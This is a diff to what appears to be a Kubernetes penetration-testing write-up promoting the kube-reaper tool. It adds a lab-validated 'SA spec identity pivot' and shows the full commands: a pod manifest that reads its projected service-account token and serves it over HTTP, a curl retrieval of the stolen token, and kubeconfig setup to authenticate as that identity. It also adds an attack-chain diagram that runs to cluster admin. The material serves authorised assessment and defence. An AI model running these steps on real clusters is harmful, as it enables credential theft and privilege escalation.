@@ -669,6 +669,115 @@ The admin scan found additional unconventional patterns across the cluster:
 
 ---
 
+## Scan 5: Identity Pivot via Pod SA Specification
+
+When you create a pod in Kubernetes, you can set `serviceAccountName` in the pod spec. The API server mounts a projected token for that service account into the pod automatically. You do not need `get secrets` permission. You do not need `create serviceaccounts/token`. You just need `create pods` in a namespace where the target SA exists.
+
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) detects this. It cross-references your pod creation permissions with every service account in each namespace. If an SA has dangerous permissions, it builds an attack chain: create a pod as that SA, harvest the projected token, authenticate as the new identity.
+
+From the admin scan, [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged multiple SA spec pivot chains:
+
+```
+Chain [CRITICAL] Identity Pivot via Pod SA Spec:
+               kubernetes-admin -> clusterrole-aggregation-controller
+────────────────────────────────────────────────────────────
+
+  kubernetes-admin can create pods in kube-system and specify
+  serviceAccountName. Create a pod as clusterrole-aggregation-controller
+  to harvest its projected token. No secret read access needed.
+
+  ├──▶ [kubernetes-admin@kube-system] Create pod with
+  │     serviceAccountName: clusterrole-aggregation-controller
+  │     (no PSS, privileged pod possible)
+  │   → Pod runs as system:serviceaccount:kube-system:
+  │     clusterrole-aggregation-controller, projected token
+  │     auto-mounted (Code Execution)
+  ├──▶ [kubernetes-admin@kube-system] Read
+  │     /var/run/secrets/kubernetes.io/serviceaccount/token from pod
+  │   → Token for system:serviceaccount:kube-system:
+  │     clusterrole-aggregation-controller acquired
+  │     (Credential Harvest)
+  └──▶ Authenticate as clusterrole-aggregation-controller.
+       SA has: Escalate Verb on ClusterRoles,
+       Create/Modify ClusterRoles
+      → Escalated permissions (Privilege Escalation)
+
+  Final Capability: Privilege Escalation
+```
+
+This matters because most identity pivot techniques require reading secrets or minting tokens through the TokenRequest API. This path needs neither. If you can create pods in a namespace, you can become any service account in that namespace.
+
+### Manual Validation: SA Spec Identity Pivot
+
+We validate this from the code-server pod. The code-server SA can create pods in the `cicd` namespace and specify `serviceAccountName`. We create a pod that runs as the `default` SA in cicd, reads its own projected token on startup, and serves it over HTTP using `hostNetwork`:
+
+```bash
+[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: sa-spec-test
+  namespace: cicd
+spec:
+  serviceAccountName: default
+  hostNetwork: true
+  containers:
+  - name: harvest
+    image: python:3-slim
+    command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/stolen-token.txt && cd /tmp && python3 -m http.server 9999"]
+EOF
+```
+
+```
+pod/sa-spec-test created
+```
+
+The pod starts on worker-2 with `hostNetwork`, so the HTTP server is reachable at the node IP. We retrieve the token:
+
+```bash
+[code-server pod] $ curl -s http://10.3.10.31:9999/tmp/stolen-token.txt -o /tmp/stolen-token.txt
+```
+
+Now we build a clean kubeconfig with the stolen token and verify the identity:
+
+```bash
+[code-server pod] $ /tmp/kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/pivot.yaml
+[code-server pod] $ /tmp/kubectl config set-credentials pivot --token=$(cat /tmp/stolen-token.txt) --kubeconfig=/tmp/pivot.yaml
+[code-server pod] $ /tmp/kubectl config set-context pivot --cluster=lab --user=pivot --kubeconfig=/tmp/pivot.yaml
+[code-server pod] $ /tmp/kubectl config use-context pivot --kubeconfig=/tmp/pivot.yaml
+```
+
+```bash
+[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/pivot.yaml auth whoami
+```
+
+```
+ATTRIBUTE   VALUE
+Username    system:serviceaccount:cicd:default
+Groups      [system:serviceaccounts system:serviceaccounts:cicd
+             system:authenticated]
+```
+
+The token works. We are now authenticated as `system:serviceaccount:cicd:default`. We created a pod, specified the SA, and harvested its projected token. We never read a secret. We never used the TokenRequest API. We just used `create pods`.
+
+In this lab, the `default` SA in cicd has no dangerous permissions. But in production clusters, teams often bind roles to the `default` SA or create SAs with broad permissions in shared namespaces. If a service account with `get secrets` or `create clusterrolebindings` lives in a namespace where you can create pods, this path gives you that identity in three steps.
+
+### Cleanup
+
+```bash
+[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig delete pod sa-spec-test -n cicd
+```
+
+```
+pod "sa-spec-test" deleted
+```
+
+```bash
+[code-server pod] $ rm -f /tmp/stolen-token.txt /tmp/pivot.yaml
+```
+
+---
+
 ## Putting It Together: The Full Attack Chain
 
 Here is the complete path from developer pod to cluster admin, as [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) mapped it and as we validated manually:
@@ -679,26 +788,54 @@ Step 1: code-server SA (development namespace)
   │ code-server has create pods permission in cicd
   │ cicd namespace has no PSS enforcement
   │
+  ├─── Path A: Privileged Pod Breakout ───────────────
+  │
   ▼
-Step 2: Deploy privileged pod in cicd
+Step 2a: Deploy privileged pod in cicd
   │
   │ Pod spec: privileged=true, hostPID, hostNetwork, hostPath=/
   │ API server accepts it (no PSS to block it)
   │ Pod runs on worker-2
   │
   ▼
-Step 3: Break out to node
+Step 3a: Break out to node
   │
   │ chroot /mnt from inside privileged container
   │ Now root on k8s-worker-2
   │
   ▼
-Step 4: Steal credentials from node filesystem
+Step 4a: Steal credentials from node filesystem
   │
   │ Read projected SA tokens from /var/lib/kubelet/pods/
   │ Read kubelet client cert from /var/lib/kubelet/pki/
   │ Read SSH keys from /root/.ssh/
   │ 7 SA tokens recovered. Kubelet cert authenticates as system:node
+  │
+  ├─── Path B: SA Spec Identity Pivot ────────────────
+  │
+  ▼
+Step 2b: Deploy pod with serviceAccountName set to target SA
+  │
+  │ Create pod in cicd with serviceAccountName: <target>
+  │ API server mounts projected token for that SA automatically
+  │ No secret read access needed
+  │
+  ▼
+Step 3b: Harvest the projected token
+  │
+  │ Pod reads its own token from
+  │ /var/run/secrets/kubernetes.io/serviceaccount/token
+  │ Serves it over HTTP via hostNetwork
+  │ Attacker retrieves token from the node IP
+  │
+  ▼
+Step 4b: Authenticate as stolen identity
+  │
+  │ Build kubeconfig with harvested token
+  │ Now operating as the target SA
+  │ Repeat for each interesting SA in the namespace
+  │
+  ├─── Both paths converge ───────────────────────────
   │
   ▼
 Step 5: Lateral movement
@@ -707,6 +844,7 @@ Step 5: Lateral movement
   │ access to all nodes)
   │ Or SSH to control plane using recovered keys
   │ Or use kubelet cert to access node-bound secrets
+  │ Or pivot through harvested SA identities
   │
   ▼
 Step 6: Control plane access
@@ -718,7 +856,9 @@ Step 6: Control plane access
 Step 7: Cluster admin
 ```
 
-[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified steps 1 through 3 automatically from the foothold scan. The admin scan with `--pivot` mapped the identity relationships that make steps 4 through 6 possible. No manual RBAC review could piece this together as fast.
+Path A is the privileged pod breakout. It gives you node-level access and every credential on that node. Path B is the SA spec identity pivot. It gives you a specific SA identity without touching the node at all. Both paths start from the same permission: `create pods` in a namespace with no PSS.
+
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified Path A (steps 1 through 3a) and Path B (steps 2b through 4b) automatically from the foothold scan. The admin scan with `--pivot` mapped the identity relationships that make step 5 onward possible. No manual RBAC review could piece this together as fast.
 
 ---
 
@@ -735,6 +875,7 @@ Step 7: Cluster admin
 | **RBAC graph enumeration** | Lists all roles, bindings, and identity profiles | Shows who has what across the entire cluster |
 | **Secret triage** | Classifies accessible secrets by attack value | Highlights SA tokens, certs, and credentials |
 | **CRD attack surface** | Identifies dangerous CRDs (Calico, Istio, etc.) | Catches service mesh and CNI misconfiguration |
+| **SA spec identity pivot** | Detects pod creation + target SA in same namespace | Steals identities without reading secrets or minting tokens |
 | **Unconventional pattern detection** | Flags escalate/bind verbs, direct ReplicaSet creation, webhook manipulation | Catches what other tools miss |
 | **Severity filtering** | `--severity high` to focus on critical findings | Cuts noise during time-limited assessments |
 | **Token authentication** | `--token` + `--server` for direct access | Works from compromised pods with no kubeconfig |
